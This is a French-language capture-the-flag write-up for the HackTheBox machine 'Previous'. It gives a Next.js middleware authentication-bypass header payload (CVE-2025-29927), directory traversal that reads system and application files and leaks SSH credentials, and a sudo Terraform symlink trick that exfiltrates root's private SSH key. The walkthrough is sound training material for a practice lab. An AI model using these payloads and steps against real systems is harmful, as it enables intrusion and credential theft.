---
date: 2026-02-11T16:28:16-06:00
# description: ""
image: "/images/HTB-Previous/Previous.png"
showTableOfContents: true
tags: ["HackTheBox", "Next.js", "CVE-2025-29927", "Terraform"]
categories: ["Writeups"]
title: "HTB: Previous"
type: "post"
---

* Platforme: HackTheBox
* Lien: [Previous](https://app.hackthebox.com/machines/Previous)
* Niveau: Moyen
* OS: Linux
---

L’exploitation de Previous débute par l’abus du `CVE-2025-29927`, une vulnérabilité de contournement de l’authentification via le middleware de Next.js, permettant d’accéder à une fonctionnalité restreinte. Cet accès est ensuite mis à profit pour exploiter une vulnérabilité de traversée de répertoires, autorisant la lecture arbitraire de fichiers et la divulgation de données sensibles de l’application, notamment des identifiants SSH. Après l’obtention d’un premier accès au système, l'élévation de privilèges est réalisée en abusant d’une exécution Terraform mal configurée avec les droits root, conduisant finalement à la récupération de la clé SSH de l’utilisateur root.

# Balayage


```
nmap -sC -sV -Pn -oA nmap/Previous {IP}
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-17 04:46 CST
Nmap scan report for 10.129.242.162 (10.129.242.162)
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)

80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://previous.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.48 seconds
```

Nmap trouve deux ports ouverts exécutant `SSH` (22) et `http` (80), il y a également une redirection vers `previous.htb` que nous ajoutons au fichier `/etc/hosts`.

```
sudo echo "{IP} previous.htb" | sudo tee -a /etc/hosts
```

# Enumération

Nous accédons au site web à l'adresse `http://previous.htb/`. Il utilise un framework Javascript appelé `PreviousJS`.

![Previous website](/images/HTB-Previous/Previous_website.png)

Lorsque nous cliquons sur `Get Started` ou  `Docs`, nous accédons à une page de connexion pour laquelle nous ne disposons d'aucun identifiant.

![Previous login page](/images/HTB-Previous/login.png)

Grâce à Wappalyzer, nous constatons que l'application utilise la version `15.2.2` de NextJS.

![Wappalyzer Previous](/images/HTB-Previous/nextjs.png)

Après avoir examiné les requêtes avec Burp, nous constatons que beaucoup passent par le répertoire `_next`. Une recherche rapide sur Google nous apprend qu'il s'agit d'un dossier interne utilisé pour charger le Javascript et les données de page de l'application.

![Previous burp requests](/images/HTB-Previous/next_reqs.png)

La capture d'une requête de connexion révèle que l'application utilise `NextAuth`, une bibliothèque d'authentification. Elle fournit une protection contre les attaques CSRF (Cross-Site Request Forgery) sur toutes les routes d'authentification.

> L'application utilise [NextAuth.js](https://next-auth.js.org/), un package d'authentification open source pour `Next.js`.

![Previous NextAuth](/images/HTB-Previous/NextAuth.png)

L’énumération des répertoires par force brute ne permet de découvrir aucun nouvel élément pertinent.

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://previous.htb
```

![Previous gobuster](/images/HTB-Previous/gobuster_previous.png)

Lors de la recherche de vulnérabilités connues affectant cette version de Next.js, nous identifions le [CVE-2025-29927](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass), une vulnérabilité permettant de contourner l’authentification via le middleware. Les applications Next.js protègent fréquemment certaines routes à l’aide de middleware, ce qui permet aux développeurs d’exécuter une logique de contrôle avant qu’une requête n’atteigne une page ou une route API. En interne, Next.js utilise l’en-tête `x-middleware-subrequest` afin de suivre l’exécution du middleware lors de sous-requêtes internes. Cet en-tête est exclusivement destiné à la communication interne du framework et ne doit pas être considéré comme fiable lorsqu’il est fourni par un client externe.

Sur les versions vulnérables :
* L'application fait confiance à l'en-tête même lorsqu'il provient de l'utilisateur.
* Si l'en-tête est présent, la logique du middleware peut être ignorée.
* Il en résulte la possibilité d'accéder à des pages protégées sans se connecter.

Le processus normal est le suivant:
```
Request --> Middleware (auth check) --> Protected page 
```

En utilisant l'en-tête malveillant:
```
Request + x-middleware-subrequest
1. Le middleware pense qu'il a déjà été exécuté.
2. La vérification d'authentification est ignorée.
3. La page protégée est servie.
```

Essayons d'exploiter cette vulnérabilité dans la page de connexion. L'article nous indique d'utiliser la charge utile suivante.

```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

> Lorsque la liste d'en-têtes contient le nom du middleware, le framework considère qu'il s'agit d'une sous-requête interne et n'applique pas les contrôles d'authentification.
> Nous répétons `middleware` car les versions récentes de Next.js intègrent un compteur de récursion afin d’éviter les boucles infinies. En interne, le framework ne saute l’exécution du middleware que si le nombre d’occurrences du nom du middleware dans l’en-tête `x-middleware-subrequest` est supérieur ou égal à la profondeur maximale de récursion (5).

Nous capturons la requête que nous obtenons après avoir cliqué sur `Docs` et y ajoutons le payload. 

![Previous auth bypass](/images/HTB-Previous/bypass_payload.png)

Insérer manuellement le payload dans chaque requête est fastidieux, nous ajoutons donc une règle dans les paramètres proxy de Burp pour résoudre ce problème.

Nous allons dans `Proxy settings` --> `Proxy`--> sous `HTTP match and replace rules` --> cliquer sur `Add` --> Ajoutons l'en-tête --> `OK`.

> Lorsque la section `Match` est laissée vide, Burp ajoute l'en-tête personnalisé à toutes les requêtes.

![Burp custom header](/images/HTB-Previous/burp_custom_header.png)

Comme le montre l'image ci-dessous, Burp ajoute automatiquement notre en-tête personnalisé à toutes les requêtes.

![Previous auth bypass](/images/HTB-Previous/customreq_header_previous.png)

Désormais, nous contournons automatiquement la fonctionnalité de connexion en cliquant simplement sur l'un des boutons disponibles sur `http://previous.htb/`.

![Previous logged in](/images/HTB-Previous/previous_logged_in.png)

La section `Examples` mène à une page proposant une fonctionnalité de téléchargement.

![Previous examples section](/images/HTB-Previous/previous_examples.png)

Un fichier nommé `hello-world.ts` est téléchargé.

![Previous download request](/images/HTB-Previous/previous_download.png)

Nous testons la traversée de répertoires et remarquons que nous pouvons lire le fichier `/etc/passwd`.

![Previous directory traversal](/images/HTB-Previous/dir_trav_previous.png)

# Accès Initial

Nous voyons deux utilisateurs: `node` et `nextjs`. Ensuite, nous lisons le fichier `/proc/self/environ`.

> `/proc/self/environ` contient les variables d'environnement du processus d'application web actuellement en cours d'exécution. Il comprend souvent des informations confidentielles telles que des identifiants, des clés API, etc.

![Previous LFI abuse](/images/HTB-Previous/proc_self_env.png)

À partir du contenu de la réponse, nous pouvons déduire plusieurs éléments:
* Le backend de l’application s’exécute avec Node.js 18.
* L’application est située dans le répertoire `/app`.

Plusieurs fichiers de configuration courants sont généralement présents à la racine d’un projet Next.js:
* `package.json`, qui définit les dépendances ainsi que les scripts npm.
* `next.config.js`, qui contient des paramètres de configuration optionnels propres à Next.js.
* Les fichiers `.env` (par exemple `.env.local`), qui peuvent être utilisés pour stocker des variables d’environnement et des secrets.

Nous lisons ensuite `package.json` et constatons que `NextAuth` y est mentionné une nouvelle fois ; cette fois-ci, sa version est également indiquée.

```
../../../app/package.json
```

![Previous package.json](/images/HTB-Previous/previous_pckg_json.png)

Nous essayons maintenant de lire le fichier de configuration `NextAuth.js`. Nous apprenons [ici](https://next-auth.js.org/configuration/initialization) que son emplacement peut être `/pages/api/auth/[...nextauth].js` ou `/app/api/auth/[...nextauth]/route.js`.

```
/pages/api/auth/[...nextauth].js
/app/api/auth/[...nextauth]/route.js
```

Après avoir essayé les deux options, nous obtenons une erreur `File not found` ce qui signifie que l'emplacement du fichier que nous avons fourni  n'est pas correct. Cela diffère d'un manque d'autorisation de lecture.

![Previous nextauth 404](/images/HTB-Previous/nextauth_404.png)

À titre d'exemple, essayons de lire `root/root.txt`. Nous savons que ce fichier existe, car il s'agit d'une machine HackTheBox. Nous obtenons une erreur `Read error`, ce qui signifie que le fichier existe, mais que nous n'avons pas l'autorisation de le lire.

![Previous read error](/images/HTB-Previous/read_err_previous.png)

Nous pourrions continuer à deviner l'emplacement spécifique du fichier, mais cela prendrait beaucoup de temps. Au lieu de cela, nous pouvons créer un exemple de projet à partir du fichier `package.son` et observer sa structure.

Ci-dessous se trouve la structure de mon projet.

![Previous sample app](/images/HTB-Previous/nextjs_sample.png)

À l'intérieur de `nextjsapp`, nous exécutons: 

```
npm install

npm run build
```

Après avoir listé le contenu de `nextjsapp`, nous pouvons voir un répertoire `.next`. Ce répertoire est généré automatiquement et est utilisé à la fois pour le développement et la production. Il contient tout ce qui est nécessaire pour exécuter l'application. Il contient donc certainement des fichiers sensibles.

![next directory](/images/HTB-Previous/next_dir.png)

Après avoir obtenu une vue d'ensemble claire de la structure du projet, il est désormais facile de comprendre pourquoi `/pages/api/auth/[...nextauth].js` ne fonctionnait pas. `/pages/api/auth/[...nextauth].js` se trouve sous `/app/.next/server`.

![next directory tree](/images/HTB-Previous/next_tree.png)

L'emplacement correct est 
```
../../../app/.next/server/pages/api/auth/[...nextauth].js
```

> Nous savions déjà que le chemin d'accès au fichier comprenait `/pages/api/auth/[...nextauth].js`, mais il n'était pas complet, ce qui expliquait pourquoi nous obtenions le message `File not found`. Une fois que nous avons trouvé les répertoires précédant `/pages`, le chemin d'accès complet était désormais clair.

![next auth](/images/HTB-Previous/nextauth_creds.png)

La réponse à la requête comprend du code JavaScript minifié, que nous traitons avec un [embellisseur](https://beautifier.io/) afin de le rendre plus lisible. Il contient des informations d'identification.

![jeremy credentials](/images/HTB-Previous/jere_creds.png)

```
jeremy:MyNameIsJeremyAndILovePancakes
```

Nous les utilisons et nous nous connectons via SSH.

# Elévation de Privilèges

En exécutant `sudo -l`, nous observons que `jeremy` peut exécuter `terraform apply` en tant que root dans `/opt/examples`. De plus, `!env_reset` indique que les variables d'environnement ne seront pas réinitialisées automatiquement lors de l'exécution de sudo.

> `env_reset` est activé par défaut, de sorte que lorsqu'une commande est exécutée avec `sudo`, la plupart des variables d'environnement sont effacées ou nettoyées. Cela permet d'éviter des manipulations telles que `LD_PRELOAD`, le détournement de `PATH`, la manipulation de plugins, etc.

![sudo-l_cmd](/images/HTB-Previous/sudo_l.png)

Dans `/opt/examples/main.tf`, la variable `source_path` est définie avec `default = "/root/examples/hello-world.ts"`. Cela signifie que si l'utilisateur ne fournit pas de valeur pour cette variable, Terraform utilisera automatiquement la valeur par défaut. De plus, tout chemin d'accès fourni doit inclure `/root/examples`.

Terraform est configuré pour utiliser un fournisseur personnalisé `previous.htb/terraform/examples`.

> Un fournisseur est un plugin qui aide Terraform à interagir avec certains systèmes externes.

![Terraform provider](/images/HTB-Previous/tf_provider.png)

Nous pouvons remplacer la valeur `default` de `source_path` en définissant notre propre chemin d'accès au fichier. Étant donné que les variables d'environnement ne seront pas réinitialisées, toutes les modifications que nous apportons seront conservées.

![sample versions](/images/HTB-Previous/examples_previous.png)

Exécutons le script.
```
sudo /usr/bin/terraform -chdir\=/opt/examples apply
```

![Terraform script](/images/HTB-Previous/tf_apply.png)

Essentiellement, `/root/examples/hello-world.ts` est copié vers `/home/jeremy/docker/previous/public/examples/hello-world.ts`.

[Sur ce site](https://developer.hashicorp.com/terraform/cli/config/environment-variables) nous montre différentes façons de définir des variables pour Terraform. Nous pouvons utiliser `TF_VAR_name` pour définir des variables. Nous avons désormais tout ce qu'il faut pour exploiter la cible.

Même s'il existe une restriction relative au chemin d'accès au fichier, celle-ci est purement basée sur une chaîne de caractères. Le script vérifie uniquement si le chemin d'accès au fichier fourni contient `/root/examples`. Il n'empêche pas non plus l'utilisation de liens symboliques.
 

1. Créer une fausse arborescence de répertoires autorisés.
```
mkdir -p /tmp/root/examples
```

2. Créer un lien symbolique pointant vers la clé privée root.
```
ln -sf /root/.ssh/id_rsa /tmp/root/examples
```

3. Remplacer la valeur par défaut de la variable `source_path`. Terraform s'exécute en tant que root et transmet notre fichier contrôlé au fournisseur.
```
TF_VAR_source_path=/tmp/root/examples/id_rsa sudo terraform -chdir\=/opt/examples apply
```
Entrer `yes` lorsque vous êtes invité à `Enter a value`.

![Terraform script run](/images/HTB-Previous/tf_id_rsa.png)


4. Le fournisseur copie le fichier référencé dans le répertoire `examples` accessible à `jeremy`, ce qui permet la divulgation de la clé SSH `root`.
```
cat /home/jeremy/docker/previous/public/examples/id_rsa
```

![Root SSH key](/images/HTB-Previous/root_SSH_key.png)

Nous nous connectons en tant qu'administrateur et lisons le fichier `root.txt`.

```
ssh -i id_rsa root@previous.htb
```

![Previous root flag](/images/HTB-Previous/previous_root_flag.png)
